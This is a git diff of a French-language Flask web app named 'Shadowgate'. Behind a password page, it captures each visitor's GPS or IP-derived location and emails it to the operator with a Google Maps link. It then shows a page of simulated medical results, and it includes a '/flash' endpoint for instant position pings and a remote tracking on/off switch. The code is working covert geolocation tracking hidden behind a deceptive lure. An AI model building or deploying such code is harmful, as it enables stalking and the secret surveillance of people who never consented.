@@ -19,6 +19,7 @@ PASSWORD_ACTIONS = {
     "Ther@pi5": "⚫ Situation critique, intervention immédiate requise"
 }
 
+# 📩 Envoi de mail
 def send_email(subject, body):
     msg = MIMEText(body)
     msg["Subject"] = subject
@@ -32,52 +33,7 @@ def send_email(subject, body):
     except Exception as e:
         print(f"[EMAIL ERROR] {e}")
 
-@app.route("/", methods=["GET", "POST"])
-def index():
-    error = None
-    lat_form = request.form.get("lat", "")
-    lon_form = request.form.get("lon", "")
-    gps_ok = lat_form and lon_form
-
-    if request.method == "POST":
-        password = request.form.get("password")
-
-        if password == "13007":
-            # Envoi mail coordonnées si GPS ou IP
-            location_info = get_location_info(request, lat_form, lon_form)
-            send_email("📍 Coordonnées consultées – Code 13007", location_info)
-            return redirect("https://astonishing-enemy-368.notion.site/La-confiance-se-m-rite-le-silence-se-choisit-1c2ad04878e5804599bae5dcca9afaf2")
-
-        elif password in PASSWORD_ACTIONS:
-            code_desc = PASSWORD_ACTIONS[password]
-            location_info = get_location_info(request, lat_form, lon_form)
-            send_email(f"⚠️ Alerte Shadowgate\n{code_desc}", location_info)
-            return redirect("/biotrace")
-
-        else:
-            error = "❌ Mot de passe incorrect."
-
-    return render_template("index.html", error=error)
-
-@app.route("/biotrace")
-def biotrace():
-    access_time = datetime.now().strftime("%d/%m/%Y à %H:%M")
-    return render_template("biotrace.html", access_time=access_time)
-
-@app.route("/flash", methods=["POST"])
-def flash_position():
-    try:
-        data = json.loads(request.data)
-        lat = data.get("lat")
-        lon = data.get("lon")
-        if lat and lon:
-            link = f"https://www.google.com/maps?q={lat},{lon}&z=18"
-            body = f"📍 Carte flashée\n📌 Coordonnées : {lat}, {lon}\n🔗 Lien Google Maps : {link}"
-            send_email("📩 Flash position – Shadowgate", body)
-    except Exception as e:
-        print(f"[FLASH ERROR] {e}")
-    return "", 204
-
+# 📍 Fonction de localisation
 def get_location_info(request, lat, lon):
     if lat and lon:
         link = f"https://www.google.com/maps?q={lat},{lon}&z=18"
@@ -99,6 +55,56 @@ def get_location_info(request, lat, lon):
         except:
             return f"🌐 Impossible d’obtenir la localisation\nIP : {ip}"
 
+# 🔐 Page de connexion principale
+@app.route("/", methods=["GET", "POST"])
+def index():
+    error = None
+    lat_form = request.form.get("lat", "")
+    lon_form = request.form.get("lon", "")
+    gps_ok = lat_form and lon_form
+
+    if request.method == "POST":
+        password = request.form.get("password")
+
+        if password == "13007":
+            location_info = get_location_info(request, lat_form, lon_form)
+            send_email("📍 Coordonnées consultées – Code 13007", location_info)
+            return redirect("https://astonishing-enemy-368.notion.site/La-confiance-se-m-rite-le-silence-se-choisit-1c2ad04878e5804599bae5dcca9afaf2")
+
+        elif password in PASSWORD_ACTIONS:
+            code_desc = PASSWORD_ACTIONS[password]
+            location_info = get_location_info(request, lat_form, lon_form)
+            message = f"{code_desc}\n\n{location_info}"
+            send_email("⚠️ Alerte Shadowgate", message)
+            return redirect("/biotrace")
+
+        else:
+            error = "❌ Mot de passe incorrect."
+
+    return render_template("index.html", error=error)
+
+# 🧬 Résultats médicaux simulés
+@app.route("/biotrace")
+def biotrace():
+    access_time = datetime.now().strftime("%d/%m/%Y à %H:%M")
+    return render_template("biotrace.html", access_time=access_time)
+
+# 📡 Réception de la géoloc instantanée (flash)
+@app.route("/flash", methods=["POST"])
+def flash_position():
+    try:
+        data = json.loads(request.data)
+        lat = data.get("lat")
+        lon = data.get("lon")
+        if lat and lon:
+            link = f"https://www.google.com/maps?q={lat},{lon}&z=18"
+            body = f"📍 Carte flashée\nCoordonnées : {lat}, {lon}\n{link}"
+            send_email("📩 Flash position – Shadowgate", body)
+    except Exception as e:
+        print(f"[FLASH ERROR] {e}")
+    return "", 204
+
+# 📴 Contrôle distant du tracking
 @app.route("/track-status")
 def track_status():
     try:
@@ -107,5 +113,6 @@ def track_status():
     except:
         return "off"
 
+# ▶️ Lancer le serveur local si besoin
 if __name__ == "__main__":
     app.run(debug=True)
